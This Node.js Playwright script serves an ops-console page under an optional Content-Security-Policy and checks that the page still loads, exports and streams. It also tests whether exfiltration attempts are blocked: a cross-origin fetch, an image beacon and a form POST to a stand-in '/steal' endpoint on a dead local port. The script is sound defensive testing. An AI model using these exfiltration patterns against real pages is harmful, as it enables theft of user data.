const http = require('http'), fs = require('fs'), { chromium } = require('playwright');
const CSP = process.argv[2];
const html = fs.readFileSync('/tmp/pr316/services/ops-console/src/ops_console/static/console.html');
const sec = (res) => { res.setHeader('Referrer-Policy','no-referrer'); res.setHeader('Cache-Control','no-store'); if (CSP) res.setHeader('Content-Security-Policy', CSP); };
const srv = http.createServer((req, res) => {
  sec(res);
  if (req.url === '/' ) { res.setHeader('content-type','text/html'); return res.end(html); }
  if (req.url.startsWith('/api/events/export')) { res.setHeader('content-type','text/csv'); res.setHeader('content-disposition','attachment; filename="x.csv"'); return res.end('a,b\n1,2\n'); }
  if (req.url.startsWith('/api/stream')) { res.setHeader('content-type','text/event-stream'); res.write('data: {"event_type":"t","agent_id":"a","hash":"h","index":1,"timestamp":"2026-01-01T00:00:00Z","payload":{}}\n\n'); return; }
  res.setHeader('content-type','application/json'); res.end(JSON.stringify({available:true,source:"x",data:[],generated_at:"2026-01-01T00:00:00Z",agents:{available:true,source:"x",data:[]},tokens:{available:true,source:"x",data:[]},escalations:{available:true,source:"x",data:[]},usage:{available:true,source:"x",data:[]},events:{available:true,source:"x",data:[]}}));
}).listen(0, async () => {
  const port = srv.address().port, origin = `http://127.0.0.1:${port}`;
  const b = await chromium.launch(); const ctx = await b.newContext({acceptDownloads: true}); const p = await ctx.newPage();
  const viol = [], errs = [];
  p.on('console', m => { const t = m.text(); if (/Content Security Policy|Refused to/i.test(t)) viol.push(t.slice(0,140)); });
  p.on('pageerror', e => errs.push(String(e).slice(0,100)));
  await p.addInitScript(() => { document.addEventListener('securitypolicyviolation', e => console.log('Refused to ' + e.violatedDirective + ' ' + e.blockedURI)); });
  await p.goto(origin + '/'); await p.waitForTimeout(800);
  const hasBody = await p.evaluate(() => typeof refresh === 'function' && document.querySelectorAll('button').length);
  // export via the page's own function
  let dl = 'none';
  try { const [d] = await Promise.all([p.waitForEvent('download', {timeout: 3000}), p.evaluate(() => exportEvents('csv'))]); dl = d.suggestedFilename(); } catch (e) { dl = 'FAILED ' + e.message.slice(0,60); }
  // SSE/fetch-stream to same origin
  const stream = await p.evaluate(async () => { try { const r = await fetch('/api/stream'); return r.status; } catch (e) { return 'ERR ' + e.message; } });
  // exfil attempts a DOM injection could make
  const probes = await p.evaluate(async (o) => {
    const out = {};
    try { await fetch('http://127.0.0.1:1/x', {mode:'no-cors'}); out.fetch_cross = 'allowed?'; } catch (e) { out.fetch_cross = 'blocked'; }
    out.img = await new Promise(r => { const i = new Image(); i.onload = () => r('loaded'); i.onerror = () => r('blocked'); i.src = 'http://127.0.0.1:1/p.png'; setTimeout(() => r('timeout'), 1500); });
    const f = document.createElement('form'); f.action = 'http://127.0.0.1:1/'; out.form_action_attr = f.action; 
    return out;
  }, origin);
  let sent = false; p.on('request', r => { if (r.url().includes(':1/steal')) sent = true; });
  try { await p.evaluate(() => { const f = document.createElement('form'); f.method='post'; f.action='http://127.0.0.1:1/steal'; document.body.appendChild(f); f.submit(); }); } catch (e) {}
  await p.waitForTimeout(1200);
  const nav = sent ? 'REQUEST TO OTHER ORIGIN WAS ATTEMPTED (form-action not restricted)' : 'blocked';
  console.log(JSON.stringify({csp: !!CSP, page_functions: hasBody, violations_on_load_and_use: viol, pageerrors: errs, export_download: dl, stream_status: stream, probes, form_post_to_other_origin: nav}, null, 1));
  await b.close(); srv.close();
});
